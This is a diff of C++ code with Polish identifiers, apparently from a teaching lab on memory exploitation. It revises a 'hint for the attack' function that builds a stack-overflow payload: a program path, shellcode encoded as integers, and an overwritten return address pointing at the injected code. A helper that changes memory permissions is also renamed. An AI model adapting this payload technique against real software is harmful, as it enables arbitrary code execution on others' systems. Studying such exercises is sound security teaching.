@@ -20,7 +20,7 @@ void wypisz(int liczba) {
 }
 
 void wypisz(long long liczba) {
-	cout << (unsigned long long) liczba << '\n';
+	cout << (long long) liczba << '\n';
 }
 
 void wypisz(unsigned long liczba) {
@@ -66,7 +66,7 @@ void zamien_bajt_pamieci(long long adres, int wartosc) {
 	*(adr) = wartosc;
 }
 
-void zamien_bajt_pamieci_zmieniajac_uprawnienia_dostepu(long long adres, char wartosc) {
+void zamien_bajt_pamieci_zmieniajac_uprawnienia(long long adres, char wartosc) {
 	void* address = (void*) adres;
 
 	const long page_size = sysconf(_SC_PAGESIZE);
@@ -85,26 +85,27 @@ void zamien_bajt_pamieci_zmieniajac_uprawnienia_dostepu(long long adres, char wa
 }
 
 void podpowiedz_do_ataku(void* adr) {
-	
-	long long res[20] = {0};
+
+	long long res[30] = {0};
 	char str[30] = "/usr/bin/nyancat";
 	long long *tab = (long long*) str;
 
 	// Te trzy komórki zawierają adres do programu `nyancat`
-	res[0] = tab[0];
-	res[1] = tab[1];
-	res[2] = tab[2];
+	res[12] = tab[0];
+	res[13] = tab[1];
+	res[14] = tab[2];
 
 	// Te komórki wpisują na stos fragment kodu, który ma go uruchomić :)
-	res[8] = 5188146771733301064;
-	res[9] = 55951160663899277;
-	res[10] = 214161162240000; 
-	res[11] = -936747884889571328;
+	res[16] = 5188146771733301064;
+	res[17] = 218559211125901;
+	res[18] = 836567040000;
+	res[19] = 2166217130385936128;
+	res[20] = -4286503217161615110;
 
-	// Adres powrotu ustawiamy na wpisany stworzony nas powyżej kod
-	res[7] = (long long) adr + 64; 
+	// Adres powrotu ustawiamy na stworzony przez nas powyżej kod
+	res[11] = adres_na_liczbe(adr) + 128;
 
-	int n = 12;
+	int n = 21;
 	cout << "Podaj dane: " << '\n';
 	cout << n << '\n';
 	for(int i = 0; i < n; i++)
